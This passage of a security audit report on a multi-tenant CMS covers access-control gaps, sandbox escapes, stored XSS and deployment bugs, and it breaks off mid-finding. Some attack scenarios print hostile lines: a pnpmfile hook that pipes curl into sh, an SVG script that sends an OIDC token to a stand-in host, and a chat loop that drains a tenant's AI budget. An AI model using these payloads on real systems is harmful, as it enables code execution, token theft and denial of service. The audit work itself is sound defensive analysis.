* `src/Services/Dcms.AdminApi/Sites/SitePreviewEndpoints.cs:33-36` — `MapMethods("/api/admin/sites/{siteId:guid}/preview/api/{**path}", …)` has only `.AuditExempt(...)`; **no `RequirePermission`/`RequireAuthorization`**
* `SitePreviewEndpoints.cs:92-146` — `ProxyAsync` → `ResolveTenantSlugAsync` uses `sites.Sites.IgnoreQueryFilters()` to resolve the tenant from the route `siteId`, then injects `X-Dcms-Tenant: <that tenant>` + `X-Dcms-Sandbox: 1` and forwards to content-api
* `src/Services/Dcms.AdminApi/Tenancy/TenantMembershipMiddleware.cs:InvokeAsync` — passes through when `me.UserId is null` or no tenant is resolved
* `src/Services/Dcms.AdminApi/Tenancy/ServicePrincipalGuard.cs` — passes through unauthenticated requests
* `tests/Dcms.IntegrationTests/Security/PermissionCoverageTests.cs:212-215` — the endpoint is in `KnownUndeclared` with the comment *"Tenant membership gates the request, but the site is resolved with IgnoreQueryFilters()… Worth a decision before it is written down as fine."*

**Summary**

The preview proxy has no authorization metadata. admin-api registers no fallback authorization policy, and both custom middlewares (`TenantMembershipMiddleware`, `ServicePrincipalGuard`) fall through for an **unauthenticated** request that sends no `X-Dcms-Tenant`. So the endpoint executes for anonymous callers. It then resolves the tenant from the supplied `siteId` (cross-tenant, `IgnoreQueryFilters`) and proxies the caller's method/path/body to content-api as that tenant, with the sandbox flag set. Even for an authenticated caller, membership is checked against `X-Dcms-Tenant` (tenant A) while the proxy acts as the `siteId`'s tenant (tenant B) — a cross-tenant confused-deputy.

**Impact**

An unauthenticated caller who knows (or obtains) a `siteId` can, as that site's tenant:
* probe existence/ownership of a site GUID (200 vs 404 oracle);
* reach content-api's whole `/api/*` surface through the admin origin with `X-Dcms-Sandbox: 1` — registering sandbox visitor accounts, submitting sandbox forms, and posting sandbox chat for another tenant, polluting its preview data;
* use admin-api as an SSRF hop to content-api.

Mitigating factors: site GUIDs are 122-bit and not enumerable by brute force (they leak to tenant members via URLs/API responses); writes land in the sandbox space, not production visitor data; content-api's public delivery is already anonymous. This bounds severity to MEDIUM rather than HIGH.

**Attack / Failure Scenario**

A former member of tenant B (whose session is gone but who noted a `siteId`) sends, unauthenticated: `POST https://admin-host/api/admin/sites/<B-siteId>/preview/api/<B-slug>/forms/contact` with a JSON body. admin-api proxies it to content-api as tenant B's sandbox, creating sandbox submissions for a tenant they have no access to.

**Verification**

Read the endpoint (no auth metadata), confirmed admin-api has no fallback policy, traced both middlewares' pass-through conditions for the unauthenticated/no-tenant case, and confirmed the coverage test explicitly deferred a decision on it. The sibling `…/preview/sandbox/reset` endpoint *does* require `site:edit`, showing the omission on the proxy is likely unintentional.

**Recommended Fix**

Require `site:edit` on the proxy and verify the caller is a member of the **site's** tenant (resolve the site under the tenant filter, or compare the resolved tenant to `ITenantContext.TenantId`). Add a positive integration test that an anonymous and a foreign-tenant caller are refused.

**Related Components**

`ProxyAsync`, content-api delivery/forms/visitors/chat, `HeaderScrubbing` (X-Dcms-Sandbox), SEC-06.

---

## [SEC-02] Mode B dependency install can execute tenant code with network access despite `--ignore-scripts`

**Severity:** MEDIUM

**Category:** Security (untrusted code execution / sandbox policy)

**Confidence:** MEDIUM (relies on documented pnpm/yarn behaviour; not executed)

**Status:** VERIFIED (open-point pass: file-map writer confirmed to allow `.pnpmfile.cjs`/`.yarnrc`/`.npmrc` — only `..`/rooted paths are rejected; install network defaults to `bridge`; sandbox runs real pnpm 11.6.0 / yarn 1.22.22. `--ignore-scripts` disables lifecycle scripts, not pnpmfile hooks or yarn `yarn-path`. Not executed against a live build.)

**Location:**

* `src/Services/Dcms.SiteBuilder/ReactAppBuilder.cs:65-91` (writes every file of the tenant's map, including dotfiles)
* `src/Services/Dcms.SiteBuilder/ReactAppBuilder.cs:259-289` (`pnpm install --frozen-lockfile --ignore-scripts`, `yarn install --ignore-scripts`)
* `src/Services/Dcms.SiteBuilder/SandboxOptions.cs:89` (`install ? (InstallNetwork ?? "bridge") : BuildNetwork`)

**Summary**

The design relies on `--ignore-scripts` so that the network-enabled install phase runs no tenant code, and only the offline build phase runs untrusted code. Package managers load configuration and hook files from the project directory that execute code regardless of that flag:
* pnpm's `.pnpmfile.cjs` (`readPackage`/`afterAllResolved` hooks; disabled only by `--ignore-pnpmfile`)
* Yarn 1's `.yarnrc` `yarn-path`, which runs an arbitrary JS file as yarn itself

The file map is written verbatim, with only `..`/rooted paths rejected, so these files reach `/work`.

**Evidence**

`BuildAsync` writes all files. `PackageManager.Detect` chooses pnpm when `pnpm-lock.yaml` exists and yarn when `yarn.lock` exists. No flag disables pnpmfile or yarn-path. The install container runs on Docker's default `bridge` network unless `DCMS_BUILD_NETWORK_INSTALL` is set, and it is not set in any compose file.

**Impact**

A tenant member with `site:edit` + `site:publish`, or repo write access pushing to `release`, runs arbitrary code for up to 10 minutes with internet egress from the platform's IP. The container has 2 CPUs and 2 GB, and reaches ports published on the Docker host gateway. The container is otherwise hardened (`--read-only`, `--cap-drop ALL`, `no-new-privileges`, pids limit), and gVisor is optional (`DCMS_BUILD_RUNTIME`, empty by default in `docker-compose.vps.yml:168`). Likely uses are abuse (scanning, spam, mining) and probing of host-published services. No path to other tenants' data was identified.

**Attack / Failure Scenario**

A site's repo contains `pnpm-lock.yaml` plus `.pnpmfile.cjs` with `module.exports = { hooks: { readPackage(p) { require('child_process').execSync('curl …|sh'); return p } } }`. A publish runs it inside the install container with network access.

**Verification**

Read `ReactAppBuilder`, `SandboxOptions`, the sandbox Dockerfile and compose env for the site-builder in all overlays. Package-manager behaviour is from public documentation; not reproduced here.

**Recommended Fix**

Add `--ignore-pnpmfile` for pnpm. Refuse or strip `.pnpmfile.cjs`, `.yarnrc`, `.yarnrc.yml`, `.npmrc` and `.yarn/` from the build tree, or copy only allow-listed paths. Install through a registry proxy on an isolated network (`DCMS_BUILD_REGISTRY` + `DCMS_BUILD_NETWORK_INSTALL` pointing to a network whose only route is the proxy). Enable gVisor by default where available.

**Related Components**

`SitePublishConsumer`, `sandbox.Dockerfile`, REL-01, INF-01.

---

## [SEC-03] Site-host internal TLS endpoints are publicly reachable through the edge's tenant catch-all

**Severity:** LOW

**Category:** Security (information disclosure)

**Confidence:** HIGH

**Status:** VERIFIED (routing traced; not requested live)

**Remediation:** FIXED in working tree — the edge returns a terminal 404 for every inbound `/internal/*` path before routing (`EdgeHttpPlane.UseInternalPathGuard`); the edge's own TLS-allow-list calls reach site-host directly on the cluster address and are unaffected.

**Location:**

* `src/Services/Dcms.SiteHost/Program.cs:44-59` (`/internal/tls-allowed`, `/internal/tls-hostnames`, no authentication)
* `src/Services/Dcms.Edge/Routing/PlatformRoutes.cs:182-194` (route `tenant-sites`: no host filter, `/{**catch-all}` → site-host)

**Summary**

The comment calls these endpoints "internal only: it is not routed from any public host", but the edge's lowest-priority route forwards **every** path on **any** unmatched `Host` to site-host, including `/internal/*`. `GET https://<any-tenant-domain or raw IP>/internal/tls-hostnames` returns every verified, site-linked customer domain on the platform. `tls-allowed?domain=` is a membership oracle.

**Evidence**

`PlatformRoutes.Build` adds no exclusion. A grep of `src/Services/Dcms.Edge` shows `/internal` only in `TlsAllowList.cs` (the internal caller). site-host maps the endpoints before the static catch-all, with no host or caller check.

**Impact**

Enumeration of all customer hostnames served by the platform. The data largely reaches Certificate Transparency logs once certificates are issued, which limits severity. It also contradicts the documented trust assumption.

**Attack / Failure Scenario**

`curl -H 'Host: anything' https://<edge-ip>/internal/tls-hostnames` → JSON array of all tenant domains.

**Verification**

Traced route order (Order 100 catch-all), edge middleware (no path filtering), site-host endpoint mapping. `tests/Dcms.UnitTests/Edge/TlsAllowListTests.cs` covers only the caller side.

**Recommended Fix**

Serve internal endpoints on a separate Kestrel port not reachable through YARP, or have site-host require the edge's service identity. At minimum add an edge route for `/internal/{**}` that returns 404 on the public plane.

**Related Components**

`Dcms.Edge/Certificates/TlsAllowList.cs`, `DomainResolver`.

---

## [SEC-04] Grafana trusts `X-WEBAUTH-*` headers from any container on the network

**Severity:** LOW

**Category:** Security (defense in depth)

**Confidence:** HIGH

**Status:** VERIFIED (open-point pass: confirmed no `whitelist` in `grafana.ini` and no `GF_AUTH_PROXY*`/whitelist in any compose file; the network is flat, INF-01.)

**Location:**

* `infra/observability/grafana/grafana.ini` `[auth.proxy] enabled = true`, no `whitelist`
* `src/Services/Dcms.Edge/Transforms/IdentityHeaders.cs` (edge asserts `X-WEBAUTH-ROLE: Admin` for SuperAdmins)
* `docker-compose.yml` (single flat network)

**Summary**

The edge correctly strips client-supplied `X-WEBAUTH-*` headers (`HeaderScrubbing.cs:56-68`). But Grafana accepts the header from **any** source IP because `auth.proxy.whitelist` is unset, and `auto_sign_up = true` with a role header lets the caller become Grafana Admin. Forgejo does restrict trusted proxies (`REVERSE_PROXY_TRUSTED_PROXIES: 172.16.0.0/12`), though that range is the whole compose network.

**Impact**

Any process that can open a TCP connection to `grafana:3000` from inside the Docker network can act as a Grafana Admin with direct datasource access (the `dcms_grafana` role, Loki, Tempo, Prometheus). This amplifies any container compromise; it is not exploitable from outside the network.

**Verification**

Read `grafana.ini`, compose `GF_*` variables (no whitelist override) and edge transforms.

**Recommended Fix**

Set `[auth.proxy] whitelist` to the edge container's fixed IP (or a dedicated network range the edge alone occupies), and give Grafana a network shared only with the edge and its datasources.

**Related Components**

INF-01.

## [SEC-08] Live-chat "agent" access is granted to any tenant member; `chat:read`/`chat:manage` are bypassed

**Severity:** MEDIUM

**Category:** Security (broken access control)

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Location:**

* `src/Services/Dcms.ContentApi/Chat/ChatHub.cs:41-75` (agent = authenticated user who is a member of the tenant named in `?tenant=`)
* `src/Services/Dcms.ContentApi/Chat/ChatHub.cs:125-152` (`SendAgentMessage`, `CloseConversation` check only `IsAgent`)
* `src/Shared/Dcms.Shared.Security/Permissions.cs` (`ChatManage` is declared, catalogued and shown in the UI but never checked; a repository search finds only descriptive uses)
* `src/Services/Dcms.AdminApi/Chat/ChatConsoleEndpoints.cs:17-54` (the REST history correctly requires `chat:read`)

**Summary**

The admin API protects chat history with `chat:read`. The hub, where live conversations actually happen, only checks tenant membership: any member, including one with no roles at all (see MISS-01), joins the `agents:{tenant}` group. They then receive every `ConversationStarted`/`ConversationActivity` event (visitor names, message previews), can post as an agent into any conversation and close conversations. `chat:manage` has no enforcement point anywhere.

**Impact**

Tenant-internal confidentiality and integrity break down for visitor conversations, which may contain personal data customers typed into a support widget. A role designed to hide chat from, say, content editors has no effect.

**Attack / Failure Scenario**

A member holding only `media:read` opens a SignalR connection to `wss://admin-host/hub/chat?tenant=<slug>&access_token=<their JWT>`, listens to all live chats and replies to visitors as the company.

**Verification**

Re-read `OnConnectedAsync` and all hub methods. Grepped for `ChatManage`/`ChatRead` enforcement (only the two REST endpoints and a notification filter). Confirmed the token is accepted on `/hub` (content-api `OnMessageReceived`) with the same audience as admin-api.

**Recommended Fix**

In `OnConnectedAsync`, resolve permissions via the same resolver as admin-api (or call admin-api) and grant the agent role only with `chat:read`. Require `chat:manage` for `SendAgentMessage`/`CloseConversation`. Also refuse suspended tenants.

**Related Components**

`apps/admin/src/features/chat/ChatPage.tsx`, `ChatFanoutConsumer`.

---

## [SEC-09] Anonymous chat messages trigger unthrottled AI completions and can exhaust a tenant's AI budget

**Severity:** MEDIUM

**Category:** Security (resource abuse / denial of wallet)

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Location:**

* `src/Services/Dcms.ContentApi/Chat/ChatHub.cs:122, 154-219` (`SendMessage` → `botResponder.Trigger` for every visitor message; no per-connection or per-conversation throttle)
* `src/Services/Dcms.ContentApi/Chat/ChatBotResponder.cs` `Trigger` (`Task.Run` fire-and-forget, unbounded)
* `src/Services/Dcms.Edge/Protection/EdgeRateLimiting.cs` `Partition` (WebSocket requests exempt from the edge limiter); content-api's `AddDcmsRateLimiting` limits HTTP requests, not hub invocations
* `src/Services/Dcms.AiGateway/AiQuota.cs` (chatbot calls use `userId: null` → key `ai:rl:{tenant}:tenant`, 60/min; daily token budget `ai:tok:{tenant}:{date}` is shared by the whole tenant)

**Summary**

A single anonymous WebSocket can invoke `StartConversation`/`SendMessage` at any rate. Each visitor message writes rows, fans out to agents, publishes to NATS and schedules an AI completion billed to the tenant's key or the platform's default key. The only brake is ai-gateway's per-tenant quota. Because the daily token budget is per tenant, draining it also denies the tenant's own editors the IDE agent, assistant and generation features until the next UTC day.

**Impact**

* Uncapped database and NATS writes from anonymous traffic.
* Up to 60 AI calls per minute and 5 M tokens per day per tenant (defaults) spent on the attacker's behalf.
* Denial of every AI feature for the tenant's staff.

**Attack / Failure Scenario**

A script opens the chat widget connection for `?tenant=acme` and loops `StartConversation` + `SendMessage("write a 2000-word essay")`. Within hours the tenant's daily budget is exhausted and Acme's editors get `budget_exhausted` from the IDE agent.

**Verification**

Traced hub method → responder → `/v1/chat` → `AiQuota.CheckAsync(tenant, null)`. Confirmed the edge's WebSocket exemption and that no hub filter or `HubOptions` limits exist in content-api `Program.cs`.

**Recommended Fix**

* Add a SignalR hub filter with per-connection and per-IP token buckets.
* Cap messages per conversation and conversations per IP.
* Queue bot replies per conversation (at most one in flight) instead of `Task.Run`.
* Give anonymous chatbot usage its own quota bucket separate from staff AI usage.
* Consider a proof-of-work or CAPTCHA for starting conversations.

**Related Components**

`packages/site-components/src/chat-widget.ts`, SEC-08.

---

## [SEC-07] Identity's interactive pages: login CSRF, no framing protection, unverified self-registration, enumeration

**Severity:** LOW

**Category:** Security (authentication hardening)

**Confidence:** HIGH

**Status:** VERIFIED (open-point pass: identity `Program.cs` has no `UseDcmsSecurityHeaders` and no antiforgery; all account POSTs `.DisableAntiforgery()`; `SignIn.RequireConfirmedAccount = false`; registration echoes a duplicate-email error.)

**Location:**

* `src/Services/Dcms.Identity/Endpoints/AccountEndpoints.cs:32-138, 144-229, 265-316` (all POSTs `.DisableAntiforgery()`)
* `src/Services/Dcms.Identity/Program.cs` (no `UseDcmsSecurityHeaders`, no antiforgery; `SignIn.RequireConfirmedAccount = false`)
* `AccountEndpoints.cs:126-129` (registration echoes Identity's "Email '…' is already taken" error)

**Summary**

* **Login CSRF:** a cross-site form can POST credentials to `/account/login`; the victim's browser then holds the attacker's session, and the SPA's next silent OIDC round-trip signs them into the attacker's account.
* **Framing:** the sign-in pages are not protected against framing (no `X-Frame-Options`/`frame-ancestors`; identity does not call `UseDcmsSecurityHeaders`), which enables clickjacking.
* **Unverified registration:** anyone can self-register with any email without verification, and each registration also provisions a Forgejo account. That gives Forgejo web-UI access past the edge `SignedIn` policy and lets an attacker pre-claim a victim's address; Google SSO for that address then fails with a duplicate-email error.
* **Enumeration:** registration reveals whether an email exists, even though the forgot-password form carefully avoids it.
* **Lockout DoS:** `lockoutOnFailure: true` lets anyone lock a known account (Identity defaults: 5 attempts). The edge limits auth traffic to 30/min per IP, so this is cheap.

**Impact**

Individually low. Together they weaken the authentication surface of the whole platform.

**Verification**

Read all account handlers, the HTML builders (output is correctly HTML-encoded; `SafeReturnUrl` rejects `//`), the pipeline and the Identity options.

**Recommended Fix**

Add antiforgery tokens to the server-rendered forms (they are same-origin HTML). Add `UseDcmsSecurityHeaders` with `frame-ancestors 'none'`. Require email confirmation before sign-in (or before Forgejo provisioning). Return a generic registration error. Consider progressive delays instead of hard lockout.

**Related Components**

`ForgejoUserSync`, edge `SignedIn` policy for `GIT_HOST`.

## [SEC-11] Admin and platform consoles are served without CSP, framing protection or HSTS

**Severity:** LOW

**Category:** Security (web hardening)

**Confidence:** HIGH

**Status:** VERIFIED (configuration)

**Location:**

* `apps/admin/nginx.conf`, `apps/platform/nginx.conf` (no `add_header`)
* `src/Services/Dcms.Edge/EdgeHttpPlane.cs` `UseEdgeHsts` (disabled when `HstsMaxAgeSeconds <= 0`), `docker-compose.prod.yml:398` (`EDGE_HSTS_MAX_AGE:-0`)
* `src/Shared/Dcms.Shared.Hosting/DcmsHostingExtensions.cs:243-258` (`UseDcmsSecurityHeaders` is used only by content-api and site-host; `Security:ContentSecurityPolicy` is unset in every compose file)

**Summary**

The two operator SPAs, which hold bearer tokens in `localStorage` and expose destructive actions (tenant purge, role grants, log purge), send no `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options` or `Referrer-Policy`. HSTS is off unless `EDGE_HSTS_MAX_AGE` is set. Meanwhile site-host, which serves tenant websites, sends `X-Frame-Options: DENY`, so tenants cannot allow their own sites to be framed.

**Impact**

No defense-in-depth against XSS (SEC-10 would be much harder to exploit under a strict CSP), clickjacking of console actions, and SSL-strip exposure on first visit.

**Verification**

Read both nginx configs, edge HSTS/redirect code, shared header helper and all compose env blocks.

**Recommended Fix**

Add a strict CSP (`default-src 'self'; frame-ancestors 'none'; connect-src` for the auth host and API; no `unsafe-inline` scripts), `nosniff`, `Referrer-Policy` and HSTS at nginx or the edge for the operator hosts. Enable HSTS in production by default. Make the tenant-site framing policy configurable per tenant.

**Related Components**

SEC-10, SEC-07.

## [SEC-12] Uploaded SVGs are served un-sanitized until (and unless) the media worker processes them

**Severity:** MEDIUM

**Category:** Security (stored XSS window)

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Location:**

* `src/Services/Dcms.AdminApi/Media/MediaIngestService.cs` (stores the raw upload at `OriginalKey`, sets status `Processing`, publishes `media.process.image`)
* `src/Services/Dcms.MediaWorker/ImageProcessingConsumer.cs:57-66` (SVG sanitized **asynchronously**, then `ReplaceOriginalAsync`)
* `src/Services/Dcms.ContentApi/Delivery/MediaDeliveryEndpoints.cs:18-46` (`/api/media/{assetId}/original`: no `asset.Status` check, serves `image/svg+xml` inline, anonymous)
* `src/Services/Dcms.AdminApi/Media/MediaEndpoints.cs:329-383` (`/api/admin/media/{id}/content`: same, no status check)

**Summary**

SVG sanitization (`SvgSanitizer`, which is itself sound: strips script/`foreignObject`/event handlers/`javascript:`/non-image `data:`, no XXE) runs in the media worker after upload. The original object is overwritten with the cleaned bytes only when that job completes. Neither delivery endpoint checks `MediaStatus`, so during the processing window — and permanently if the NATS `media.process.image` message is lost or the worker is down (INF-01 makes message loss plausible) — the raw attacker SVG is served inline with `image/svg+xml`.

**Impact**

Stored XSS on the tenant's public site origin (via content-api on the custom domain) and on the admin origin (`/api/admin/media/{id}/content`). An SVG with an inline `<script>` executes in the origin that serves it. On the admin host this compounds SEC-10/SEC-11 (token theft from `localStorage`).

**Attack / Failure Scenario**

An editor uploads `x.svg` containing `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//e/'+localStorage.getItem('oidc.user:...'))</script></svg>`, then immediately shares `/api/admin/media/<id>/content`. A colleague opening it within the processing window (or any time, if the worker is down) runs the script as the admin origin.

**Verification**

Traced ingest → storage key → worker sanitize/replace → both delivery endpoints. Confirmed no status gate in delivery and no `Content-Disposition`/CSP on the responses. `SvgSanitizer` reviewed and found robust for the post-processing case.

**Recommended Fix**

* Sanitize SVGs synchronously in `MediaIngestService` before the first store (it is cheap, unlike raster transcoding), or refuse to serve `original` while `Status != Ready`.
* Serve user SVGs with `Content-Disposition: attachment` or `Content-Security-Policy: default-src 'none'; sandbox`, or rasterize them.
* Add a status gate to both delivery endpoints.

**Related Components**

`WebpLadderGenerator`, `MediaResolver`, INF-01, SEC-10.

## [SEC-13] CMS rich-text is stored and rendered without server-side sanitization

**Severity:** LOW

**Category:** Security (stored XSS, defense-in-depth)

**Confidence:** MEDIUM

**Status:** VERIFIED (open-point pass: solution-wide search confirms no HTML sanitizer exists for CMS content; the published site template and Mode A hydrate render the stored HTML with `innerHTML`.)

**Remediation:** FIXED in working tree — rich-text is sanitized server-side on write (create/update/publish/schedule) with a vetted allow-list sanitizer (`HtmlContentSanitizer`, Ganss/AngleSharp): `javascript:`/`data:` schemes, event handlers and script/style/object/iframe are stripped; TipTap formatting survives.

**Location:**

* `apps/admin/src/features/content/RichTextEditor.tsx` (TipTap authoring; HTML stored as-is)
* `packages/site-template-react/templates/content/src/components/RichText.tsx:11` (`dangerouslySetInnerHTML` on the published site)
* `src/Services/Dcms.SiteBuilder/Runtime/hydrate.js:615-616` — a `data-dcms-bind="html:<field>"` binding assigns the resolved content value straight to `el.innerHTML` (the `text:` target uses `textContent`, which is safe); also `:758,784,789` for template/plugin rendering
* No HTML sanitizer anywhere in the solution (grep found only media/SVG sanitizers)

**Summary**

Rich-text content fields are HTML authored in TipTap and persisted verbatim; there is no server-side sanitization on write or delivery. The published site template and the Mode A hydrate runtime inject that HTML with `innerHTML`. This is the conventional "a CMS trusts its authors" model, and the template documents it. But `content:write` is a granular, delegable permission, so a low-tier editor can plant script that runs on the tenant's public site.

**Impact**

Stored XSS on the tenant's published site, executable by anyone with `content:write`. Confined to the tenant's own origin (visitors, other editors). The admin app renders content through TipTap's schema (which drops `<script>` on parse), so admin-origin execution is largely mitigated there — but not on the public site.

**Verification**

Confirmed no HTML sanitizer in the backend; read the template and hydrate rendering. The threat model is documented in `RichText.tsx`.

**Recommended Fix**

Sanitize rich-text server-side on write (e.g. HtmlSanitizer/Ganss) against an allow-list, and/or sanitize in the delivery/hydrate path. Even under a "trust authors" model, defense-in-depth against a delegated editor is worthwhile.

**Related Components**

`ContentEndpoints`, `PublishedContentReader`, SEC-10.

## 2. Dead Code & Unused Functionality

## [DEAD-01] Unimplemented plugin custom-endpoint API and an unwired edge route overlay

**Severity:** LOW

**Category:** Dead Code / Incomplete abstraction

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Location:**

* `src/PluginSdk/Dcms.PluginSdk.Runtime/PluginRouteTable.cs:48-65` (`RecordingEndpointBuilder.Group`, `MapGet`, `MapPost` all `throw new NotSupportedException`)
* `src/PluginSdk/Dcms.PluginSdk.Abstractions/IPluginEndpointBuilder.cs` (the interface advertises these)
* `src/Shared/Dcms.Shared.Data/Edge/EdgeEntities.cs:141` (`EdgeRoute`), `src/Services/Dcms.Edge/Routing/DatabaseRouteSource.cs` (reads `edge.routes`); no code writes `edge.routes`

**Summary**

Two abstractions exist but are inert:
1. `IPluginEndpointBuilder` offers `Group`/`MapGet`/`MapPost`, but the only implementation throws for all three. Plugins can declare content list/get-by-slug routes and nothing else; any plugin calling these would crash at startup.
2. The edge reads a database route overlay (`edge.routes`) and merges it, but no service or migration ever inserts a row, and the DB-route path does not set the public-plane metadata. It is a read-only feature with no producer.

**Impact**

Confuses future contributors and gives the SDK a surface the runtime cannot honour. Not a runtime bug today because nothing calls the throwing methods.

**Verification**

Grepped for callers of `MapGet`/`MapPost` on `IPluginEndpointBuilder` (none among the 19 plugins) and for writers of `EdgeRoute`/`edge.routes` (none).

**Recommended Fix**

Either implement custom plugin endpoints, or remove them from the interface until needed. Either wire an admin surface for `edge.routes` or drop the overlay.

**Related Components**

`Dcms.Plugins.*`, `EdgeConfigProvider`.

## 3. Bugs & Correctness

## [BUG-01] A push to `release` while a build is running is silently never deployed

**Severity:** MEDIUM

**Category:** Bug (lost update)

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Remediation:** FIXED in working tree — latest-wins catch-up: on every build's terminal event admin-api re-reads the release head and queues one catch-up build of the head if it moved past the finished build and nothing is in flight (`SiteEndpoints.ContinueIfReleaseMovedAsync`, wired into both site notification consumers).

**Location:**

* `src/Services/Dcms.AdminApi/Sites/SiteEndpoints.cs:1043-1052` (webhook coalescing)
* `src/Services/Dcms.AdminApi/Sites/SiteEndpoints.cs:1053-1062` (snapshot taken at enqueue: `git.ReadFilesAsync(repoFull, afterSha ?? branch)`)
* `src/Services/Dcms.AdminApi/Sites/SiteEndpoints.cs:470-477` (publish = merge into `release`, then rely on the webhook)

**Summary**

The webhook skips a push when any build for the site is `Queued`/`Building` (`return Results.Ok(new { skipped = "build in flight" })`). The comment says the push is "folded into a build already in flight", but the in-flight build was created with the file snapshot of the **earlier** commit (`DefinitionSnapshotJson` is fixed when the build row is created). Nothing re-queues a build afterwards.

**Impact**

A user who clicks Publish (or pushes to `release`) while a previous build is running gets `202 released`. The IDE announces the commit, but the live site stays on the older commit indefinitely, until someone pushes again or clicks "redeploy". Git-backed sites are the Mode A and Mode B cases, and Mode B builds take ~30 s, so the window is common.

**Attack / Failure Scenario**

An editor publishes change A (build starts, ~30 s). Ten seconds later they fix a typo and publish change B. The webhook for B hits `inFlight == true` and is dropped. Build A finishes and goes live. B is never deployed, though the UI said it was released.

**Verification**

Traced publish → `git.MergeAsync` → Forgejo webhook → coalescing check → build creation. Confirmed the snapshot is read at enqueue time and that no completion hook in `SitePublishConsumer` or admin-api checks for a newer `release` head. No test covers overlapping pushes (`tests/Dcms.IntegrationTests/Sites/*`).

**Recommended Fix**

Replace drop-coalescing with "latest wins": record the pushed SHA as `Site.PendingReleaseSha` and, when a build completes, enqueue a new build if the release head differs from the built SHA. Alternatively enqueue anyway and have the consumer skip superseded builds.

**Related Components**

BUG-03, `SiteLiveUpdates`.

---

## [BUG-04] Tenant purge leaves AI transcripts, social tokens and notifications behind

**Severity:** MEDIUM

**Category:** Bug (incomplete deletion / data remanence)

**Confidence:** HIGH

**Status:** VERIFIED (code; surfaced during open-point verification)

**Location:**

* `src/Services/Dcms.AdminApi/Tenancy/TenantAdminEndpoints.cs:247-390` (`TenantDeleter.DeleteAsync`)
* Deleted: cms, media, forms, search, analytics, chat, `ai.UserSettings`/`ai.Settings`, visitors, tenancy, storage prefixes, Forgejo org.
* **Not deleted:** `ai.Conversations`, `ai.Messages`, `ai.Runs`; the entire `social` schema (`MetaConnections`, `MetaSyncStates`, `MetaMediaMap`, `MetaOAuthStates`); the `notifications` schema (`Notifications`, `Recipients`).

**Summary**

`TenantDeleter` sweeps most tenant schemas but its `AiDbContext` sweep removes only the two settings tables, not the conversation transcripts, and it has no `SocialDbContext` or `NotificationsDbContext` at all. All three hold rows keyed by `TenantId` (they are in `RlsConfigurator.TenantTables`). After an advertised "purge everything" delete, those rows are orphaned against a non-existent tenant.

**Impact**

* **`ai.messages`** hold whole AI tool results — the RLS comment itself notes they contain "draft content, analytics figures … lifted out of the tenant's data." These survive the purge, which is a privacy/erasure gap (the delete is offered to Owners as irreversible workspace deletion).
* **`social.meta_connections`** hold Vault-Transit-encrypted Meta access/page tokens (encrypted, so not plaintext credentials, but still tenant secrets that should be destroyed).
* **`notifications`** rows persist, referencing a deleted tenant.

**Verification**

Read `TenantDeleter` end to end; enumerated its injected DbContexts and every `ExecuteDeleteAsync`. Cross-checked `AiDbContext`/`SocialDbContext`/`NotificationsDbContext` DbSets and the RLS tenant-table list. There are no cross-schema FKs to cascade these.

**Recommended Fix**

Add sweeps for `ai.Conversations`/`ai.Messages`/`ai.Runs`, the four `social.*` tables, and `notifications.*` (`Notifications`, `Recipients`). Consider a test that asserts every table in `RlsConfigurator.TenantTables` is covered by `TenantDeleter` (mirroring the RLS coverage assertion), so a new tenant table cannot be forgotten here.

**Related Components**

`MyAccountEndpoints` (self-delete detaches memberships only — correct), `RlsConfigurator.TenantTables`, ADR 0003.

---

## [BUG-03] Site activation is "last finisher wins" and trusts the queued message

**Severity:** LOW

**Category:** Bug (race / idempotency)

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Remediation:** FIXED in working tree — activation resolves the site from the build (not the message) and only advances `ActiveBuildId` when the finished build is at least as new as the current active one (`SitePublishConsumer.BuildAsync`).

**Location:**

* `src/Services/Dcms.SiteBuilder/SitePublishConsumer.cs:237-249` (`site.ActiveBuildId = build.Id` unconditionally, site loaded by `job.SiteId`)
* `src/Services/Dcms.SiteBuilder/SiteBuildLane.cs:66-69` (static lane concurrency 2)
* `src/Services/Dcms.AdminApi/Sites/SiteEndpoints.cs:439-536, 1118-1128` (Mode C publish and git rebuild enqueue without an in-flight check)
* `src/Services/Dcms.AdminApi/Sites/SiteEndpoints.cs:214-235` (`/activate` publishes no `site.published`)

**Summary**

1. When a build completes, the consumer activates it regardless of whether a newer build has already gone live, and regardless of a manual rollback made meanwhile. The static lane runs two builds concurrently, and the Mode C publish and git "redeploy" paths do not coalesce, so an older, slower build can overwrite a newer active build.
2. The consumer loads the site by `job.SiteId` from the message instead of `build.SiteId`, so a message pairing one site with another site's build would activate a foreign artifact prefix. Only reachable by publishing to NATS directly (INF-01).
3. `POST …/builds/{id}/activate` (rollback) changes `ActiveBuildId` but emits no `site.published`. site-host keeps serving the previous build from its 5-minute `DomainResolver` cache.

**Impact**

Stale content can go live after a newer publish, and a rollback takes up to 5 minutes to apply. With NATS access, cross-tenant defacement is possible.

**Verification**

Read the consumer, lanes, all three enqueue sites and `SiteCacheInvalidator` (listens only for `site.published`).

**Recommended Fix**

Activate only if `build.CreatedAt` is newer than the currently active build (or compare a monotonically increasing sequence) and the build belongs to the site: `db.Sites.Where(s => s.Id == build.SiteId)`. Publish `site.published` (or a dedicated `site.activated`) from the activate endpoint.

**Related Components**

BUG-01, INF-01, `DomainResolver`.

---

## [BUG-02] Upload limits advertised by the API cannot be reached: requests over ~28.6 MB are rejected

**Severity:** LOW

**Category:** Bug (configuration regression)

**Confidence:** HIGH (framework defaults per YARP and Kestrel documentation; not reproduced)

**Status:** VERIFIED (open-point pass: confirmed no `MaxRequestBodySize` on any edge route and no Kestrel limit override in any config; per YARP 2.3 docs the server default (~28.6 MiB) applies. Not reproduced live.)

**Location:**

* `src/Services/Dcms.Edge/Routing/PlatformRoutes.cs:218-234` (no `RouteConfig.MaxRequestBodySize`), `src/Services/Dcms.Edge/Program.cs` (no Kestrel limit override)
* `src/Shared/Dcms.Shared.Storage/StaticSiteFiles.cs:12` (`MaxUploadBytes = 100 MB`), `src/Services/Dcms.AdminApi/Sites/SiteEndpoints.cs:118-124`
* `src/Services/Dcms.AdminApi/Media/MediaIngestService.cs:41` and `MediaEndpoints.cs:28-33` ("50 MB inline upload limit")

**Summary**

